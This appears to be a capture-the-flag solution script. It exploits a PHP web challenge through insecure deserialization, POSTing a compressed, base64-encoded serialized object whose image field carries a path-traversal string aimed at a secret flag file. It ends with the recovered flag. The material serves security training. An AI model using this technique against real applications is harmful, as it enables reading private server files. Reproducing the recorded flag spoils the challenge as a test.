import requests
import zlib
import base64

#N.B: this script only runs with "python", don't use python3!

#getting the serialization of the object in the way I wrote on the notes
#O:7:"Product":5:{s:11:"Productid";i:0;s:13:"Productname";s:6:"asdasd";s:20:"Productdescription";s:6:"asdasd";s:16:"Productpicture";s:27:"../../../../secret/flag.txt";s:14:"Productprice";i:0;}

#but remember that echo doesn't print the spaces! I have to add the spaces where they are:
#O:7:"Product":5:{s:11:"\x00Product\x00id";i:0;s:13:"\x00Product\x00name";s:6:"asdasd";s:20:"\x00Product\x00description";s:6:"asdasd";s:16:"\x00Product\x00picture";s:27:"../../../../secret/flag.txt";s:14:"\x00Product\x00price";i:0;}

o = """O:7:"Product":5:{s:11:"\x00Product\x00id";i:0;s:13:"\x00Product\x00name";s:6:"asdasd";s:20:"\x00Product\x00description";s:6:"asdasd";s:16:"\x00Product\x00picture";s:27:"../../../../secret/flag.txt";s:14:"\x00Product\x00price";i:0;}"""
obj = base64.b64encode(zlib.compress(o))
print(obj)
r = requests.post("http://jinblack.it:3006/api/cart.php", data={'state': obj})

import IPython
IPython.embed()

#when I get the object, the flag will be the picture field.
#However, this is encoded, so I have to decode it! (see more details on the notes)

#flag: actf{welcome_to_the_new_web_0836eef79166b5dc8b}